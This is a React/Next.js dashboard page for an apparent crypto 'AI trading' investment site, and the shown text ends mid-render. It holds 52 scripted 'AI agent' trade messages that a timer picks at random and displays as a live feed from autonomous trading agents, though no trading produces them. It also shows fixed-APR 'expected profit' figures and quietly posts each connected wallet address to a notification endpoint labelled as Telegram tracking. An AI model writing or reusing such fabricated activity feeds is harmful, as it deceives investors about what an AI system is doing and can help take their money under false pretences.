"use client";
import { useState, useEffect, useRef } from "react";
import { useAccount } from "wagmi";
import { useSession } from "next-auth/react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import WithdrawModal from "../components/WithdrawModal";
import ConnectWallet from "../components/ConnectWallet";

// ─── 52 Realistic AI Agent Messages (all prices dynamic) ──────────────────────
const AI_LOGS: Array<{ bot: string; msg: (p: any) => string }> = [
  // Arbitrage (13)
  { bot: "Arbitrage", msg: (p) => `Binance-Bybit spread detected: 0.12% on ETH/USDT — executing` },
  { bot: "Arbitrage", msg: (p) => `Cross-exchange arb: BTC $${p.BTC.toLocaleString()} → $${(p.BTC * 1.001).toLocaleString()} (+0.10%)` },
  { bot: "Arbitrage", msg: (p) => `Triangular arbitrage: ETH→BTC→USDT→ETH completed, net +0.08%` },
  { bot: "Arbitrage", msg: (p) => `Latency arbitrage executed: 47ms round-trip, +$${(p.BTC * 0.00018).toFixed(0)} profit` },
  { bot: "Arbitrage", msg: (p) => `Funding rate arb: Long Bybit / Short Binance (+0.015% every 8h)` },
  { bot: "Arbitrage", msg: (p) => `DEX-CEX spread: Uniswap ETH $${(p.ETH * 1.002).toFixed(0)} vs Binance $${p.ETH.toFixed(0)} — arb captured` },
  { bot: "Arbitrage", msg: (p) => `Statistical arbitrage: ETH/BTC pair deviation 2.3σ — entering mean-reversion` },
  { bot: "Arbitrage", msg: (p) => `Cross-margin arb completed: +$342 on $500k notional position` },
  { bot: "Arbitrage", msg: (p) => `Perpetual swap basis trade: +0.23% annualized yield captured on BTC perp` },
  { bot: "Arbitrage", msg: (p) => `MEV protection: Front-run attempt detected at $${p.ETH.toFixed(0)}, tx re-routed` },
  { bot: "Arbitrage", msg: (p) => `OKX-Binance spread: 0.09% on BTC/USDT — order filled at $${p.BTC.toLocaleString()}` },
  { bot: "Arbitrage", msg: (p) => `Hyperliquid perp vs spot basis: +0.15% — captured in 2 blocks` },
  { bot: "Arbitrage", msg: (p) => `Spot-futures basis: ETH front-month $${(p.ETH * 1.003).toFixed(0)} vs spot $${p.ETH.toFixed(0)} — 0.3% premium locked` },

  // Macro (11)
  { bot: "Macro", msg: (p) => `Fed rate decision analysis complete: Bullish signal for risk assets` },
  { bot: "Macro", msg: (p) => `Institutional flow: $2.3B BTC inflow to exchanges in last 24h` },
  { bot: "Macro", msg: (p) => `CPI data release: Lower than expected — increasing crypto allocation` },
  { bot: "Macro", msg: (p) => `DXY weakness: Dollar index down 0.8% — BTC correlation +0.72 confirmed` },
  { bot: "Macro", msg: (p) => `Treasury yield curve inversion deepening — rotating to BTC hedge` },
  { bot: "Macro", msg: (p) => `China PBOC liquidity injection: Positive spillover to crypto expected` },
  { bot: "Macro", msg: (p) => `ETF flow: BlackRock IBIT +$127M inflow today, total AUM growing` },
  { bot: "Macro", msg: (p) => `Global M2 expanding at 6.2% YoY — liquidity tailwind for BTC $${p.BTC.toLocaleString()}` },
  { bot: "Macro", msg: (p) => `Geopolitical risk premium rising — demand for non-sovereign assets up` },
  { bot: "Macro", msg: (p) => `FOMC minutes hawkish tone noted — trimming leverage, holding spot` },
  { bot: "Macro", msg: (p) => `Bitcoin dominance at 54.3% — altcoin rotation window narrowing` },

  // Risk (11)
  { bot: "Risk", msg: (p) => `Portfolio VaR adjusted to 2.3% — reducing leverage by 15%` },
  { bot: "Risk", msg: (p) => `Stop-loss triggered on BTC at $${(p.BTC * 0.98).toFixed(0)} — capital protected` },
  { bot: "Risk", msg: (p) => `Volatility regime change: 30-day realized vol up 18% — activating hedge` },
  { bot: "Risk", msg: (p) => `ETH/BTC correlation dropped to 0.61 — rebalancing cross-asset exposure` },
  { bot: "Risk", msg: (p) => `Drawdown threshold -3.2% hit — reducing position sizes across all bots` },
  { bot: "Risk", msg: (p) => `Order book depth declining on ETH pairs — increasing slippage buffer` },
  { bot: "Risk", msg: (p) => `Exchange reserve concentration risk: Diversifying across 4 venues` },
  { bot: "Risk", msg: (p) => `New DeFi protocol flagged: Unaudited contract — exposure blocked` },
  { bot: "Risk", msg: (p) => `Tail risk hedge: Buying OTM puts on BTC $${(p.BTC * 0.9).toFixed(0)} strike, 14 DTE` },
  { bot: "Risk", msg: (p) => `Margin call prevention: Auto-deleveraging 12% of perpetual positions` },
  { bot: "Risk", msg: (p) => `Open interest spike on ETH: $${(p.ETH * 0.0021).toFixed(0)}M increase in 1h — monitoring squeeze risk` },

  // Liquidity (9)
  { bot: "Liquidity", msg: (p) => `Uniswap V3 ETH/USDC pool: Concentrated range set $${(p.ETH * 0.97).toFixed(0)}-$${(p.ETH * 1.03).toFixed(0)}` },
  { bot: "Liquidity", msg: (p) => `Impermanent loss hedge activated: Delta-neutral via perp short` },
  { bot: "Liquidity", msg: (p) => `Curve Finance 3pool yield: 8.4% APY — reallocating $150k USDT` },
  { bot: "Liquidity", msg: (p) => `Slippage optimization: $${(p.BTC * 0.5).toFixed(0)} order split into 12 chunks, saved 0.07%` },
  { bot: "Liquidity", msg: (p) => `AMM fee tier reallocation: Moving from 0.3% to 0.05% ETH/USDC pool` },
  { bot: "Liquidity", msg: (p) => `Concentrated liquidity rebalanced: New range $${(p.ETH * 0.98).toFixed(0)}-$${(p.ETH * 1.02).toFixed(0)} on Uniswap V3` },
  { bot: "Liquidity", msg: (p) => `Flash loan executed: Aave borrow → Uniswap swap → repay (+0.15%, $${(p.ETH * 0.15).toFixed(0)} profit)` },
  { bot: "Liquidity", msg: (p) => `MEV block builder: TX bundled via Flashbots, saved $234 in gas` },
  { bot: "Liquidity", msg: (p) => `Balancer V2 pool rebalanced: ETH weight adjusted from 50% to 60%` },

  // Options (9)
  { bot: "Options", msg: (p) => `Covered call written: ETH $${(p.ETH * 1.05).toFixed(0)} strike, 7 DTE — premium +0.8 ETH collected` },
  { bot: "Options", msg: (p) => `Put selling: BTC $${(p.BTC * 0.95).toFixed(0)} strike, 30 DTE — +$1,240 premium received` },
  { bot: "Options", msg: (p) => `Iron condor: BTC $${(p.BTC * 0.94).toFixed(0)}-$${(p.BTC * 1.06).toFixed(0)} range, max profit $890` },
  { bot: "Options", msg: (p) => `IV rank at 45% — favorable environment for premium selling` },
  { bot: "Options", msg: (p) => `Delta hedge adjusted: Short 0.42 BTC futures per 10 ETH calls` },
  { bot: "Options", msg: (p) => `Gamma squeeze risk: ETH $${(p.ETH * 1.02).toFixed(0)} strike has $${(p.ETH * 12).toFixed(0)}M open interest` },
  { bot: "Options", msg: (p) => `Put-call skew at 6% — elevated downside demand detected` },
  { bot: "Options", msg: (p) => `Theta decay harvested: +$${(p.ETH * 0.002).toFixed(0)} today on short strangle positions` },
  { bot: "Options", msg: (p) => `Calendar spread opened: Short ETH $${(p.ETH * 1.03).toFixed(0)} weekly / Long monthly` },

  // Dual (9)
  { bot: "Dual", msg: (p) => `Dual investment initiated: ETH/USDT at 14.2% APY, strike $${(p.ETH * 1.02).toFixed(0)}` },
  { bot: "Dual", msg: (p) => `Yield optimization: Rotating USDT to ETH dual product at 14.8% APY` },
  { bot: "Dual", msg: (p) => `Dual currency matured: Delivered in ETH at $${p.ETH.toFixed(0)}, +1.2% yield earned` },
  { bot: "Dual", msg: (p) => `Shark Fin structured product: Capital protection + BTC $${(p.BTC * 1.08).toFixed(0)} upside cap` },
  { bot: "Dual", msg: (p) => `Autocompound enabled: Reinvesting dual yield every 4 hours` },
  { bot: "Dual", msg: (p) => `BTC dual investment: Strike $${(p.BTC * 1.03).toFixed(0)}, 7-day tenor, 9.6% APY` },
  { bot: "Dual", msg: (p) => `Dual product settled: USDT delivered, annualized return 15.1%` },
  { bot: "Dual", msg: (p) => `Stacking dual positions: ETH $${(p.ETH * 1.01).toFixed(0)} + BTC $${(p.BTC * 1.01).toFixed(0)} strikes — blended 12.4% APY` },
  { bot: "Dual", msg: (p) => `Range dual product: ETH $${(p.ETH * 0.98).toFixed(0)}-$${(p.ETH * 1.02).toFixed(0)} — enhanced yield 18.7% APY` },
];

const BOT_COLORS: Record<string, string> = {
  Arbitrage: "text-blue-400",
  Risk: "text-red-400",
  Macro: "text-violet-400",
  Liquidity: "text-cyan-400",
  Options: "text-amber-400",
  Dual: "text-green-400",
};

// ─── Stat Card ────────────────────────────────────────────────────────────────
function StatCard({ label, value, sub, accent, icon }: {
  label: string; value: string; sub: string; accent: string; icon: React.ReactNode;
}) {
  return (
    <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-5 md:p-6 flex flex-col gap-3">
      <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${accent}`}>
        {icon}
      </div>
      <div>
        <div className="text-slate-500 text-xs mb-1">{label}</div>
        <div className="text-2xl md:text-3xl font-bold text-white">{value}</div>
        <div className="text-slate-500 text-xs mt-1">{sub}</div>
      </div>
    </div>
  );
}

// ─── Overview ─────────────────────────────────────────────────────────────────
function OverviewSection({ stats, onWithdraw, address, prices }: any) {
  const [logs, setLogs] = useState<Array<{ bot: string; msg: string; time: string }>>([]);

  useEffect(() => {
    if (!prices || prices.BTC === 0) return;
    const shuffled = [...AI_LOGS].sort(() => Math.random() - 0.5).slice(0, 6);
    const initial = shuffled.map((l, i) => {
      const now = new Date();
      now.setSeconds(now.getSeconds() - i * 17);
      return { bot: l.bot, msg: l.msg(prices), time: now.toTimeString().slice(0, 8) };
    });
    setLogs(initial);
  }, [prices.BTC, prices.ETH]);

  useEffect(() => {
    if (!prices || prices.BTC === 0) return;
    const interval = setInterval(() => {
      const now = new Date();
      const random = AI_LOGS[Math.floor(Math.random() * AI_LOGS.length)];
      setLogs((prev) => [
        { bot: random.bot, msg: random.msg(prices), time: now.toTimeString().slice(0, 8) },
        ...prev.slice(0, 7),
      ]);
    }, 3500);
    return () => clearInterval(interval);
  }, [prices]);

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 md:gap-4">
        <StatCard
          label="Total Balance"
          value={`$${stats.totalBalance.toLocaleString()}`}
          sub="All assets combined"
          accent="bg-blue-500/15"
          icon={<svg className="w-5 h-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1" /></svg>}
        />
        <StatCard
          label="Active Investments"
          value={String(stats.activeInvestments)}
          sub="Running plans"
          accent="bg-violet-500/15"
          icon={<svg className="w-5 h-5 text-violet-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" /></svg>}
        />
        <StatCard
          label="Total Earned"
          value={`$${stats.totalEarned.toLocaleString()}`}
          sub="Lifetime returns"
          accent="bg-green-500/15"
          icon={<svg className="w-5 h-5 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>}
        />
        <StatCard
          label="Pending Withdrawals"
          value={`$${stats.pendingWithdrawals.toLocaleString()}`}
          sub="Processing"
          accent="bg-amber-500/15"
          icon={<svg className="w-5 h-5 text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>}
        />
      </div>

      {prices && prices.BTC > 0 && (
        <div className="rounded-2xl border border-blue-500/20 bg-slate-900/60 backdrop-blur-xl p-5 md:p-6">
          <div className="flex items-center gap-2 mb-4">
            <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
            <h3 className="text-sm font-semibold text-slate-300 uppercase tracking-wider">Live Market Prices</h3>
          </div>
          <div className="grid grid-cols-2 gap-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-orange-500/20 flex items-center justify-center">
                <span className="text-orange-400 font-bold">₿</span>
              </div>
              <div>
                <div className="text-xs text-slate-500">Bitcoin</div>
                <div className="text-lg font-bold text-white">${prices.BTC.toLocaleString(undefined, { maximumFractionDigits: 0 })}</div>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center">
                <span className="text-blue-400 font-bold">Ξ</span>
              </div>
              <div>
                <div className="text-xs text-slate-500">Ethereum</div>
                <div className="text-lg font-bold text-white">${prices.ETH.toLocaleString(undefined, { maximumFractionDigits: 2 })}</div>
              </div>
            </div>
          </div>
        </div>
      )}

      {!address && (
        <div className="rounded-2xl border border-blue-500/30 bg-blue-500/5 backdrop-blur-xl p-5 md:p-6 flex flex-col sm:flex-row items-start sm:items-center gap-4">
          <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center flex-shrink-0">
            <svg className="w-5 h-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
          </div>
          <div className="flex-1">
            <div className="text-white font-semibold text-sm mb-0.5">Connect your wallet to see your portfolio</div>
            <div className="text-slate-400 text-xs">Link a Web3 wallet to track investments, balances and earnings in real time.</div>
          </div>
          <div className="flex-shrink-0">
            <ConnectWallet />
          </div>
        </div>
      )}

      <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-5 md:p-7">
        <h2 className="text-base font-semibold text-slate-300 uppercase tracking-wider mb-4">Quick Actions</h2>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          <Link href="/invest" className="flex items-center gap-4 p-4 rounded-xl border border-blue-500/25 bg-blue-500/10 hover:bg-blue-500/20 transition group">
            <div className="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" /></svg>
            </div>
            <div>
              <div className="font-semibold text-white text-sm">New Investment</div>
              <div className="text-xs text-slate-500">Start earning today</div>
            </div>
          </Link>
          <button onClick={onWithdraw} className="flex items-center gap-4 p-4 rounded-xl border border-green-500/25 bg-green-500/10 hover:bg-green-500/20 transition text-left">
            <div className="w-10 h-10 rounded-lg bg-green-500/20 flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
            </div>
            <div>
              <div className="font-semibold text-white text-sm">Withdraw Funds</div>
              <div className="text-xs text-slate-500">Cash out anytime</div>
            </div>
          </button>
          <Link href="/roadmap" className="flex items-center gap-4 p-4 rounded-xl border border-violet-500/25 bg-violet-500/10 hover:bg-violet-500/20 transition">
            <div className="w-10 h-10 rounded-lg bg-violet-500/20 flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-violet-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7" /></svg>
            </div>
            <div>
              <div className="font-semibold text-white text-sm">View Roadmap</div>
              <div className="text-xs text-slate-500">Track platform progress</div>
            </div>
          </Link>
        </div>
      </div>

      <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-5 md:p-7">
        <div className="flex items-center justify-between mb-5">
          <div>
            <h2 className="text-base font-semibold text-slate-300 uppercase tracking-wider">AI Agent Activity</h2>
            <p className="text-xs text-slate-500 mt-0.5">Live feed from autonomous trading agents</p>
          </div>
          <div className="flex items-center gap-2 text-xs text-green-400 font-semibold">
            <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
            LIVE
          </div>
        </div>
        <div className="space-y-2 max-h-64 overflow-hidden">
          {logs.map((log, i) => (
            <div key={i} className="flex items-start gap-3 p-3 rounded-xl bg-slate-800/40 border border-slate-700/30 transition-all" style={{ opacity: 1 - i * 0.1 }}>
              <span className="text-slate-600 font-mono text-xs pt-0.5 flex-shrink-0 w-16">{log.time}</span>
              <span className={`text-xs font-bold flex-shrink-0 w-20 ${BOT_COLORS[log.bot] || "text-slate-400"}`}>{log.bot}</span>
              <span className="text-slate-300 text-xs leading-relaxed">{log.msg}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── Investments ──────────────────────────────────────────────────────────────
const ASSET_ICONS: Record<string, { icon: string; color: string; bg: string }> = {
  ETH:  { icon: "Ξ",  color: "text-blue-400",   bg: "bg-blue-500/20" },
  BTC:  { icon: "₿",  color: "text-orange-400", bg: "bg-orange-500/20" },
  USDT: { icon: "$",  color: "text-green-400",  bg: "bg-green-500/20" },
  SOL:  { icon: "◎",  color: "text-violet-400", bg: "bg-violet-500/20" },
  XRP:  { icon: "✕",  color: "text-cyan-400",   bg: "bg-cyan-500/20" },
  BNB:  { icon: "⬡",  color: "text-amber-400",  bg: "bg-amber-500/20" },
  LINK: { icon: "⬡",  color: "text-blue-300",   bg: "bg-blue-500/15" },
  NEAR: { icon: "Ν",  color: "text-pink-400",   bg: "bg-pink-500/20" },
};

function fmt(date: string) {
  return new Date(date).toLocaleDateString("uk-UA", {
    day: "2-digit", month: "2-digit", year: "numeric",
  });
}

function daysLeft(settlementAt: string | null): number | null {
  if (!settlementAt) return null;
  return Math.max(0, Math.ceil((new Date(settlementAt).getTime() - Date.now()) / 86400000));
}

function InvestmentsSection({ address }: { address?: string }) {
  const [investments, setInvestments] = useState<any[]>([]);

  useEffect(() => {
    try {
      const key = address ? `nx_inv_${address}` : "nx_inv_guest";
      const data = JSON.parse(localStorage.getItem(key) || "[]");
      setInvestments(data.reverse()); // найновіші зверху
    } catch {}
  }, [address]);

  if (investments.length === 0) {
    return (
      <div className="space-y-5">
        <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-3">
          <div>
            <h2 className="text-2xl font-bold text-white">My Investments</h2>
            <p className="text-slate-500 text-sm mt-1">All your active and completed plans</p>
          </div>
          <Link href="/invest" className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-violet-600 hover:from-blue-500 hover:to-violet-500 text-white font-semibold text-sm transition shadow-lg shadow-blue-500/20 text-center">
            + New Investment
          </Link>
        </div>
        <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-10 md:p-16 text-center">
          <div className="w-16 h-16 rounded-2xl border border-slate-700/50 bg-slate-800/60 flex items-center justify-center mx-auto mb-5">
            <svg className="w-8 h-8 text-slate-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M21 13.255A23.931 23.931 0 0112 15c-3.183 0-6.22-.62-9-1.745M16 6V4a2 2 0 00-2-2h-4a2 2 0 00-2 2v2m4 6h.01M5 20h14a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
          </div>
          <div className="text-lg font-semibold text-slate-300">No active investments</div>
          <div className="text-slate-600 mt-1 text-sm max-w-xs mx-auto">Your investments will appear here once you make your first deposit.</div>
          <Link href="/invest" className="inline-flex items-center gap-2 mt-6 px-6 py-3 rounded-xl bg-gradient-to-r from-blue-600 to-violet-600 hover:from-blue-500 hover:to-violet-500 text-white font-semibold text-sm transition shadow-lg shadow-blue-500/20">
            Start Investing
            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" /></svg>
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-5">
      <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-3">
        <div>
          <h2 className="text-2xl font-bold text-white">My Investments</h2>
          <p className="text-slate-500 text-sm mt-1">{investments.length} active plan{investments.length !== 1 ? "s" : ""}</p>
        </div>
        <Link href="/invest" className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-violet-600 hover:from-blue-500 hover:to-violet-500 text-white font-semibold text-sm transition shadow-lg shadow-blue-500/20 text-center">
          + New Investment
        </Link>
      </div>

      <div className="space-y-4">
        {investments.map((inv: any) => {
          const icon = ASSET_ICONS[inv.asset] || { icon: "?", color: "text-slate-400", bg: "bg-slate-500/20" };
          const remaining = daysLeft(inv.settlementAt);
          const isFlexible = inv.plan === "Flexible";
          const progress = inv.lockDays && remaining !== null
            ? Math.round(((inv.lockDays - remaining) / inv.lockDays) * 100)
            : null;

          return (
            <div key={inv.id} className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-5 md:p-6">
              {/* Header */}
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-3">
                  <div className={`w-10 h-10 rounded-xl ${icon.bg} flex items-center justify-center font-bold text-lg ${icon.color}`}>
                    {icon.icon}
                  </div>
                  <div>
                    <div className="font-bold text-white text-base">{inv.asset}</div>
                    <div className="text-xs text-slate-500">{inv.plan}</div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <span className="px-2.5 py-1 rounded-full bg-blue-500/15 border border-blue-500/30 text-blue-400 text-xs font-bold">
                    {inv.apr}% APR
                  </span>
                  <span className="px-2.5 py-1 rounded-full bg-green-500/15 border border-green-500/30 text-green-400 text-xs font-semibold">
                    Active
                  </span>
                </div>
              </div>

              {/* Stats grid */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
                <div className="bg-slate-800/40 rounded-xl p-3">
                  <div className="text-xs text-slate-500 mb-1">Invested</div>
                  <div className="font-bold text-white">{inv.amount} {inv.asset}</div>
                </div>
                <div className="bg-slate-800/40 rounded-xl p-3">
                  <div className="text-xs text-slate-500 mb-1">Expected profit</div>
                  <div className="font-bold text-green-400">+{inv.profit} {inv.asset}</div>
                </div>
                <div className="bg-slate-800/40 rounded-xl p-3">
                  <div className="text-xs text-slate-500 mb-1">Start date</div>
                  <div className="font-bold text-white text-sm">{fmt(inv.investedAt)}</div>
                </div>
                <div className="bg-slate-800/40 rounded-xl p-3">
                  <div className="text-xs text-slate-500 mb-1">Settlement</div>
                  <div className="font-bold text-white text-sm">
                    {isFlexible ? "Anytime" : inv.settlementAt ? fmt(inv.settlementAt) : "—"}
                  </div>
                </div>
              </div>

              {/* Total return */}
              <div className="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-green-500/10 to-blue-500/10 border border-green-500/20">
                <span className="text-sm text-slate-400">Total at maturity</span>
                <span className="font-black text-white text-base">
                  {inv.total} {inv.asset}
                  <span className="text-green-400 text-sm font-semibold ml-2">(+{inv.apr}% APR)</span>
                </span>
              </div>

              {/* Progress bar for locked plans */}
              {!isFlexible && progress !== null && (
                <div className="mt-3">
                  <div className="flex justify-between text-xs text-slate-500 mb-1">
                    <span>{progress}% complete</span>
                    <span>{remaining} days remaining</span>
                  </div>
                  <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-gradient-to-r from-blue-500 to-violet-500 rounded-full transition-all"
                      style={{ width: `${progress}%` }}
                    />
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ─── Transactions ─────────────────────────────────────────────────────────────
function TransactionsSection() {
  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-2xl font-bold text-white">Transaction History</h2>
        <p className="text-slate-500 text-sm mt-1">All deposits, withdrawals, and payouts</p>
      </div>
      <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-10 md:p-16">
        <div className="text-center">
          <div className="w-16 h-16 rounded-2xl border border-slate-700/50 bg-slate-800/60 flex items-center justify-center mx-auto mb-5">
            <svg className="w-8 h-8 text-slate-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" /></svg>
          </div>
          <div className="text-lg font-semibold text-slate-300">No transactions yet</div>
          <div className="text-slate-600 mt-1 text-sm max-w-xs mx-auto">Once you make your first investment, all on-chain activity will appear here.</div>
        </div>
      </div>
    </div>
  );
}

// ─── Settings ─────────────────────────────────────────────────────────────────
function SettingsSection({ address }: { address?: string }) {
  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-2xl font-bold text-white">Settings</h2>
        <p className="text-slate-500 text-sm mt-1">Wallet and account preferences</p>
      </div>
      <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-5 md:p-7 space-y-5">
        <h3 className="text-sm font-semibold text-slate-400 uppercase tracking-wider">Profile</h3>
        <div>
          <label className="block text-slate-400 mb-2 text-xs font-medium uppercase tracking-wider">Wallet Address</label>
          <div className="rounded-xl border border-slate-700/50 bg-slate-800/50 p-4 font-mono text-xs text-slate-300 break-all">
            {address || "Not connected"}
          </div>
        </div>
        <div className="flex items-center gap-3 p-4 rounded-xl border border-green-500/20 bg-green-500/10">
          <svg className="w-5 h-5 text-green-400 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
          <div>
            <div className="font-semibold text-green-300 text-sm">Wallet Verified</div>
            <div className="text-xs text-green-500/70">Your wallet is securely connected via Web3</div>
          </div>
        </div>
        <div className="pt-2 border-t border-slate-700/50">
          <h3 className="text-sm font-semibold text-slate-400 uppercase tracking-wider mb-4">Security</h3>
          <div className="space-y-3">
            {[
              { label: "Two-Factor Authentication", status: "Coming soon", color: "text-slate-500" },
              { label: "Withdrawal Whitelist", status: "Coming soon", color: "text-slate-500" },
              { label: "Email Notifications", status: "Coming soon", color: "text-slate-500" },
            ].map((item) => (
              <div key={item.label} className="flex items-center justify-between p-3 rounded-xl bg-slate-800/40 border border-slate-700/30">
                <span className="text-sm text-slate-300">{item.label}</span>
                <span className={`text-xs font-semibold ${item.color}`}>{item.status}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Main Page ────────────────────────────────────────────────────────────────
export default function DashboardPage() {
  const { address, isConnected } = useAccount();
  const { data: session, status } = useSession();
  const isGoogleAuth = status === "authenticated";
  const isAuthorized = isConnected || isGoogleAuth;
  const router = useRouter();
  const [activeTab, setActiveTab] = useState("overview");
  const [stats, setStats] = useState({
    totalBalance: 0,
    activeInvestments: 0,
    totalEarned: 0,
    pendingWithdrawals: 0,
  });
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [prices, setPrices] = useState({ BTC: 0, ETH: 0, USDT: 1 });

  // Завантаження цін
  useEffect(() => {
    async function loadPrices() {
      try {
        const response = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether&vs_currencies=usd"
        );
        const data = await response.json();
        setPrices({
          BTC: data.bitcoin?.usd || 0,
          ETH: data.ethereum?.usd || 0,
          USDT: data.tether?.usd || 1,
        });
      } catch (error) {
        console.error("Price loading error:", error);
      }
    }
    loadPrices();
    const interval = setInterval(loadPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Завантаження даних з Flask backend
  useEffect(() => {
    if (!address) return;
    const load = async () => {
      try {
        const res = await fetch(`http://127.0.0.1:5000/api/dashboard/${address}`);
        const data = await res.json();
        setStats({
          totalBalance: data.totalBalance || 0,
          activeInvestments: data.activeInvestments || 0,
          totalEarned: data.totalEarned || 0,
          pendingWithdrawals: data.pendingWithdrawals || 0,
        });
      } catch (e) {
        console.error(e);
      }
    };
    load();
    const interval = setInterval(load, 10000);
    return () => clearInterval(interval);
  }, [address]);

  // Редирект якщо не авторизований
  useEffect(() => {
    if (!isConnected && status !== "loading" && status !== "authenticated") router.push("/");
  }, [isConnected, status, router]);

  // ─── Telegram: трекінг підключення кошелька ───────────────────────────────
  const notifiedWallet = useRef<string>("");
  useEffect(() => {
    if (!address || !isConnected) return;
    if (notifiedWallet.current === address) return; // вже повідомляли про цей кошелек
    notifiedWallet.current = address;
    fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "wallet_connect", address }),
    }).catch(() => {});
  }, [address, isConnected]);

  if (status === "loading") {
    return (
      <div className="min-h-screen flex items-center justify-center text-white" style={{ background: "#020617" }}>
        <div className="text-center px-4">
          <div className="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <div className="text-slate-500 text-sm">Loading...</div>
        </div>
      </div>
    );
  }

  if (!isConnected && !isGoogleAuth) {
    return (
      <div className="min-h-screen flex items-center justify-center text-white" style={{ background: "#020617" }}>
        <div className="text-center px-4">
          <div className="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <div className="text-slate-500 text-sm">Redirecting...</div>
